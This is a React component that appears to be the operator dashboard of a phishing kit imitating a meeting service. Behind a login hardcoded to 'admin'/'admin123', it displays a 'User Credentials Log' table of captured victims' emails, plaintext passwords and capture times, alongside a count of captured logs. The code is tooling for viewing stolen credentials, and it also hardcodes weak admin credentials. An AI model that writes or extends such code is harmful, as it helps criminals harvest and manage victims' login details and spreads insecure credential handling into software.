
import React, { useState, useEffect } from 'react';
import { MeetingStatus, LoginLog } from '../types';

interface AdminDashboardProps {
  status: MeetingStatus;
  onLoginSuccess: () => void;
  onLogout: () => void;
}

const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess, onLogout }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [logs, setLogs] = useState<LoginLog[]>([]);

  useEffect(() => {
    if (status === MeetingStatus.ADMIN_DASHBOARD) {
      const savedLogs = JSON.parse(localStorage.getItem('meet_logs') || '[]');
      setLogs(savedLogs.reverse());
    }
  }, [status]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    // Default admin credentials
    if (username === 'admin' && password === 'admin123') {
      onLoginSuccess();
    } else {
      setError('Invalid username or password');
    }
  };

  const clearLogs = () => {
    if (window.confirm('Are you sure you want to clear all logs?')) {
      localStorage.removeItem('meet_logs');
      setLogs([]);
    }
  };

  if (status === MeetingStatus.ADMIN_LOGIN) {
    return (
      <div className="fixed inset-0 bg-[#0f172a] flex items-center justify-center z-[200] p-4">
        <div className="max-w-md w-full bg-white rounded-2xl p-8 shadow-2xl">
          <div className="text-center mb-8">
            <h1 className="text-2xl font-bold text-gray-900">Admin Dashboard</h1>
            <p className="text-gray-500 text-sm mt-1">Please login to continue</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Username</label>
              <input 
                type="text" 
                value={username} 
                onChange={(e) => setUsername(e.target.value)} 
                className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none text-gray-900" 
                placeholder="admin"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Password</label>
              <input 
                type="password" 
                value={password} 
                onChange={(e) => setPassword(e.target.value)} 
                className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none text-gray-900" 
                placeholder="••••••••"
              />
            </div>
            {error && <p className="text-red-500 text-xs">{error}</p>}
            <button type="submit" className="w-full bg-blue-600 text-white py-2 rounded-lg font-medium hover:bg-blue-700 transition-colors">
              Sign In
            </button>
            <button type="button" onClick={onLogout} className="w-full text-gray-500 text-sm hover:underline">
              Back to Home
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-[#f8fafc] z-[200] flex flex-col font-sans text-gray-900">
      {/* Sidebar / Header */}
      <header className="bg-white border-b px-6 py-4 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center text-white">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
          </div>
          <h1 className="text-xl font-bold">Admin Console</h1>
        </div>
        <div className="flex items-center gap-4">
          <button 
            onClick={onLogout}
            className="text-sm font-medium text-gray-600 hover:text-gray-900"
          >
            Logout
          </button>
        </div>
      </header>

      <main className="flex-1 overflow-y-auto p-6 md:p-10">
        <div className="max-w-7xl mx-auto">
          {/* Stats */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
            <div className="bg-white p-6 rounded-xl shadow-sm border border-gray-100">
              <p className="text-gray-500 text-sm font-medium">Total Captured Logs</p>
              <h2 className="text-3xl font-bold mt-2">{logs.length}</h2>
            </div>
            <div className="bg-white p-6 rounded-xl shadow-sm border border-gray-100">
              <p className="text-gray-500 text-sm font-medium">Server Status</p>
              <div className="flex items-center gap-2 mt-2">
                <span className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></span>
                <h2 className="text-xl font-bold text-green-600">Active</h2>
              </div>
            </div>
          </div>

          {/* Table */}
          <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
            <div className="px-6 py-4 border-b flex items-center justify-between">
              <h3 className="font-bold text-gray-800">User Credentials Log</h3>
              <button 
                onClick={clearLogs}
                className="text-xs bg-red-50 text-red-600 px-3 py-1 rounded hover:bg-red-100 transition-colors"
              >
                Clear All
              </button>
            </div>
            <div className="overflow-x-auto">
              <table className="w-full text-left">
                <thead className="bg-gray-50 text-xs text-gray-500 uppercase font-medium">
                  <tr>
                    <th className="px-6 py-4">ID</th>
                    <th className="px-6 py-4">Email / ID</th>
                    <th className="px-6 py-4">Password</th>
                    <th className="px-6 py-4">Captured At</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-100">
                  {logs.length > 0 ? logs.map((log) => (
                    <tr key={log.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4 text-xs text-gray-400">{log.id.slice(-6)}</td>
                      <td className="px-6 py-4 font-medium text-blue-600">{log.email}</td>
                      <td className="px-6 py-4 font-mono text-gray-600">{log.password}</td>
                      <td className="px-6 py-4 text-sm text-gray-500">{log.timestamp}</td>
                    </tr>
                  )) : (
                    <tr>
                      <td colSpan={4} className="px-6 py-10 text-center text-gray-400 italic">
                        No logs captured yet.
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default AdminDashboard;
